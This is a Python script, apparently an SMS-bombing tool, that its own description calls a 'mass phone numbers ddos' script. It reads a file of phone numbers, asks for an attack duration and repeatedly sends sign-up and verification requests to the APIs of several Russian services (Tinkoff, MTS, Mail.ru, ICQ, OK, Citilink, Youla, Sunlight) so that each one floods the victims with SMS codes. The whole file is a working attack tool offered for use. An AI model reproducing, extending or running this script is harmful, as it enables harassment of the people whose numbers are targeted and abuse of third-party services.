import requests, module, argparse, time, os
from module import clr
phones = []
messagesSend = 0
timer = time.time()

parser = argparse.ArgumentParser(description="Script for mass phone numbers ddos")
parser.add_argument('--phone', type=str, help="Path to file with phone numbers")
args = parser.parse_args()

def attack():
    global timeAttack
    global timer
    global messagesSend
    timer = time.time()
    os.system("cls")
    os.system("clear")
    print(clr.Fore.MAGENTA + module.attackLogo)
    while time.time() < timer + timeAttack:
        for _phone in phones:
            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
                messagesSend+=1
                print(f"[{messagesSend}] Tinkoff отправлен")
            except:
                print("Tinkoff не отправле")
            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                messagesSend += 1
                print(f"[{messagesSend}] Sunlight отправлен")
            except:
                print("Sunlight не отправлен")
            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                messagesSend += 1
                print(f"[{messagesSend}] MTS отправлен")
            except:
                print("MTS не отправлен")

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
                messagesSend += 1
                print(f"[{messagesSend}] Mail.ru отправлен")
            except:
                print("Mail.ru не отправлен")

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                messagesSend += 1
                print(f"[{messagesSend}] ICQ отправлен")
            except:
                print("ICQ не отправлен")

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + _phone})
                messagesSend += 1
                print(f"[{messagesSend}] OK отправлен")
            except:
                print("OK не отправлен")

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                messagesSend += 1
                print(f"[{messagesSend}] Citilink отправлен")
            except:
                print("Citilink не отправлен")

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                messagesSend += 1
                print(f"[{messagesSend}] Youla отправлен")
            except:
                print("Youla не отправлен")

            # try:
            #     messagesSend += 1
            #     print(f"[{messagesSend}]  отправлен")
            # except:
            #     print(" не отправлен")
            #
            # try:
            #     messagesSend += 1
            #     print(f"[{messagesSend}]  отправлен")
            # except:
            #     print(" не отправлен")
            time.sleep(2)


print(clr.Fore.MAGENTA + module.logo)
print(clr.Fore.RED + module.author)

with open(args.phone, "r") as file:
    phones = file.read().split("\n")

print(clr.Fore.CYAN + "\n" * 2)
print("Номера телефонов в файле:")
for i in range(len(phones)):
    print("[" + str(i+1) + "]: " + phones[i])

timeAttack = int(input("\n" + clr.Fore.RED + "Введи время атаки (в секундах): "))

answ = input("\n" + clr.Fore.RED + "Вы хотите запустить атаку? (1 - Да, 2 - Нет): ")
if answ == "1":
    attack()
